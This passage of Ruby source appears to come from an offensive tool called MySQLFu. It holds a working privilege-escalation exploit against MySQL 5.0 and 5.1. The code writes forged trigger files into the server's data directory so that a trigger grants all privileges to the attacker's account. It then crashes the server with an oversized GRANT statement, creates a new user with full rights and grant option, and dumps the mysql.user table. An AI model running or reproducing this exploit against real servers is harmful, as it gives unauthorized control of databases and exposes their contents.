						puts "[".light_red + "X".white + "] Returning to previous menu".light_red + ".....".white
					else
						puts "[".light_yellow + "?".white + "] Please provide name for Database current user has proper rights to".light_yellow + ": ".white
						dbName = gets.chomp
						puts
						puts "[".light_yellow + "?".white + "] Please provide name for NEW User we will create".light_yellow + ": ".white
						newUser = gets.chomp
						puts
						puts "[".light_yellow + "?".white + "] Please provide PASSWORD for NEW User are about to create".light_yellow + ": ".white
						newUserPass = gets.chomp
						puts
						# can be 5.1.x or 5.0.x
						if @version =~ /5.0/
							@inject = "select 'TYPE=TRIGGERS' into outfile'#{@datadir}#{dbName}/rootme.TRG' LINES TERMINATED BY '\\ntriggers=\\'CREATE DEFINER=`root`\@`localhost` trigger atk after insert on rootme for each row\\\\nbegin \\\\nUPDATE mysql.user SET Select_priv=\\\\\\'Y\\\\\\', Insert_priv=\\\\\\'Y\\\\\\', Update_priv=\\\\\\'Y\\\\\\', Delete_priv=\\\\\\'Y\\\\\\', Create_priv=\\\\\\'Y\\\\\\', Drop_priv=\\\\\\'Y\\\\\\', Reload_priv=\\\\\\'Y\\\\\\', Shutdown_priv=\\\\\\'Y\\\\\\', Process_priv=\\\\\\'Y\\\\\\', File_priv=\\\\\\'Y\\\\\\', Grant_priv=\\\\\\'Y\\\\\\', References_priv=\\\\\\'Y\\\\\\', Index_priv=\\\\\\'Y\\\\\\', Alter_priv=\\\\\\'Y\\\\\\', Show_db_priv=\\\\\\'Y\\\\\\', Super_priv=\\\\\\'Y\\\\\\', Create_tmp_table_priv=\\\\\\'Y\\\\\\', Lock_tables_priv=\\\\\\'Y\\\\\\', Execute_priv=\\\\\\'Y\\\\\\', Repl_slave_priv=\\\\\\'Y\\\\\\', Repl_client_priv=\\\\\\'Y\\\\\\', Create_view_priv=\\\\\\'Y\\\\\\', Show_view_priv=\\\\\\'Y\\\\\\', Create_routine_priv=\\\\\\'Y\\\\\\', Alter_routine_priv=\\\\\\'Y\\\\\\', Create_user_priv=\\\\\\'Y\\\\\\', ssl_type=\\\\\\'Y\\\\\\', ssl_cipher=\\\\\\'Y\\\\\\', x509_issuer=\\\\\\'Y\\\\\\', x509_subject=\\\\\\'Y\\\\\\', max_questions=\\\\\\'Y\\\\\\', max_updates=\\\\\\'Y\\\\\\', max_connections=\\\\\\'Y\\\\\\' WHERE User=\\\\\\'#{@user}\\\\\\';\\\\nend\\'\\nsql_modes=0\\ndefiners=\\'root\@localhost\\'\\nclient_cs_names=\\'latin1\\'\\nconnection_cl_names=\\'latin1_swedish_ci\\'\\ndb_cl_names=\\'latin1_swedish_ci\\'\\n';"
						elsif @version =~ /5.1/
							@inject = "select 'TYPE=TRIGGERS' into outfile'#{@datadir}#{dbName}/rootme.TRG' LINES TERMINATED BY '\\ntriggers=\\'CREATE DEFINER=`root`\@`localhost` trigger atk after insert on rootme for each row\\\\nbegin \\\\nUPDATE mysql.user SET Select_priv=\\\\\\'Y\\\\\\', Insert_priv=\\\\\\'Y\\\\\\', Update_priv=\\\\\\'Y\\\\\\', Delete_priv=\\\\\\'Y\\\\\\', Create_priv=\\\\\\'Y\\\\\\', Drop_priv=\\\\\\'Y\\\\\\', Reload_priv=\\\\\\'Y\\\\\\', Shutdown_priv=\\\\\\'Y\\\\\\', Process_priv=\\\\\\'Y\\\\\\', File_priv=\\\\\\'Y\\\\\\', Grant_priv=\\\\\\'Y\\\\\\', References_priv=\\\\\\'Y\\\\\\', Index_priv=\\\\\\'Y\\\\\\', Alter_priv=\\\\\\'Y\\\\\\', Show_db_priv=\\\\\\'Y\\\\\\', Super_priv=\\\\\\'Y\\\\\\', Create_tmp_table_priv=\\\\\\'Y\\\\\\', Lock_tables_priv=\\\\\\'Y\\\\\\', Execute_priv=\\\\\\'Y\\\\\\', Repl_slave_priv=\\\\\\'Y\\\\\\', Repl_client_priv=\\\\\\'Y\\\\\\', Create_view_priv=\\\\\\'Y\\\\\\', Show_view_priv=\\\\\\'Y\\\\\\', Create_routine_priv=\\\\\\'Y\\\\\\', Alter_routine_priv=\\\\\\'Y\\\\\\', Create_user_priv=\\\\\\'Y\\\\\\', Event_priv=\\\\\\'Y\\\\\\', Trigger_priv=\\\\\\'Y\\\\\\', ssl_type=\\\\\\'Y\\\\\\', ssl_cipher=\\\\\\'Y\\\\\\', x509_issuer=\\\\\\'Y\\\\\\', x509_subject=\\\\\\'Y\\\\\\', max_questions=\\\\\\'Y\\\\\\', max_updates=\\\\\\'Y\\\\\\', max_connections=\\\\\\'Y\\\\\\' WHERE User=\\\\\\'#{@user}\\\\\\';\\\\nend\\'\\nsql_modes=0\\ndefiners=\\'root\@localhost\\'\\nclient_cs_names=\\'latin1\\'\\nconnection_cl_names=\\'latin1_swedish_ci\\'\\ndb_cl_names=\\'latin1_swedish_ci\\'\\n';"
						end
						@inject2 =
						"SELECT 'TYPE=TRIGGERNAME\\ntrigger_table=rootme;' into outfile '#{@datadir}#{dbName}/atk.TRN' FIELDS ESCAPED BY ''";
						begin
							@db = Mysql.connect("#{$module_required['Server']}", "#{$module_required['Username']}", "#{$module_required['Password']}")
							query = @db.query("USE #{dbName};")
						rescue Mysql::Error => e
							puts "[".light_red + "X".white + "] Problem connecting with provided credentials".light_red + "!".white
							puts "\t=> #{e}".red
							puts
							mysqlMenu
						end #end begin/rescue wrapper
						begin
							query = @db.query("DROP TABLE IF EXISTS rootme;")
							query = @db.query("CREATE TABLE rootme (rootme VARCHAR(256));")
							query = @db.query("#{@inject}")
							query = @db.query("#{@inject2}")
							@a = "A" * 10000;
							query = @db.query("GRANT ALL ON #{@a}.* TO 'upgrade'\@'%' identified by 'foofucked';")
						rescue Mysql::Error => e
							puts "[".light_green + "*".white + "] Caused MySQL to spaz".light_green + "!".white
							puts "\t=> #{e}".red
							sleep 3;
						end #end begin/rescue wrapper
						begin
							@db = Mysql.connect("#{$module_required['Server']}", "#{$module_required['Username']}", "#{$module_required['Password']}")
							query = @db.query("USE #{dbName};")
							query = @db.query("INSERT INTO rootme VALUES('ROOTED');");
							query = @db.query("GRANT ALL ON #{@a}.* TO 'upgrade'\@'%' identified by 'foofucked';")
						rescue Mysql::Error => e
							puts "[".light_green + "*".white + "] Caused MySQL to spaz again".light_green + "!".white
							puts "\t=> #{e}".red
							sleep 3;
						end #end begin/rescue wrapper
						begin
							@db = Mysql.connect("#{$module_required['Server']}", "#{$module_required['Username']}", "#{$module_required['Password']}")
							query = @db.query("USE #{dbName};")
							query = @db.query("CREATE USER '#{newUser}'\@'%' IDENTIFIED BY '#{newUserPass}';")
							query = @db.query("GRANT ALL PRIVILEGES ON *.* TO '#{newUser}'\@'%' WITH GRANT OPTION;")
							query = @db.query("GRANT ALL ON #{@a}.* TO 'upgrade'\@'%' identified by 'foofucked';")
						rescue Mysql::Error => e
							puts "[".light_green + "*".white + "] Caused MySQL to spaz AGAIN, last time".light_green + "!".white
							puts "\t=> #{e}".red
							sleep 3;
						end #end begin/rescue wrapper
						begin
							@db = Mysql.connect("#{$module_required['Server']}", "#{newUser}", "#{newUserPass}")
							puts "[".light_green + "*".white + "] w00t".light_green + " - ".white + "success".light_green + "!".white
							query = @db.query('SELECT @@hostname;')
							query.each { |x| puts "Hostname: ".light_green + "#{x[0]}".white } 
							query = @db.query('SELECT user();')
							query.each { |x| puts "Loged in as NEW User: ".light_green + "#{x[0]}".white } 
							puts "[".light_green + "*".white + "] Using NEW Pass: ".light_green + "#{newUserPass}".white
							query = @db.query('SELECT @@version;')
							query.each { |x| puts "[".light_green + "*".white + "] MySQL Version: ".light_green + "#{x[0]}".white; @version = "#{x}"; } 
							puts "[".light_green + "*".white + "] Updated MySQL User Table After Exploit".light_green + ": ".white
							query = @db.query("SELECT * FROM mysql.user;")
							query.each { |x| puts "#{x.join(',')}".white }
							puts "[".light_green + "*".white + "] Performing some quick cleanup from exploit process to remove foooooofucker user created by exploit".light_green + ".....".white
							query = @db.query('USE mysql;')
							query = @db.query("DROP USER 'foooooofucker'@'%';")
							query = @db.query('FLUSH PRIVILEGES;')
							puts "[".light_green + "*".white + "] All done, Enjoy".light_green + "!".white
						rescue Mysql::Error => e
							puts "[".light_red + "X".white + "] Problem connecting with NEW USER credentials".light_red + "!".white
							puts "\t=> #{e}".red
							sleep 3;
							puts "[".light_red + "X".white + "] FAIL".light_red + "!".white
						end #end begin/rescue wrapper
					end
					puts
				else
					cls
					puts
					puts "Oops, Didn't quite understand that one".light_red + "!".white
					puts "Please Choose a Numbered Option From Below".light_red + ": ".white
					puts
					options
				end
		end
	end
end

MySQLFu.new
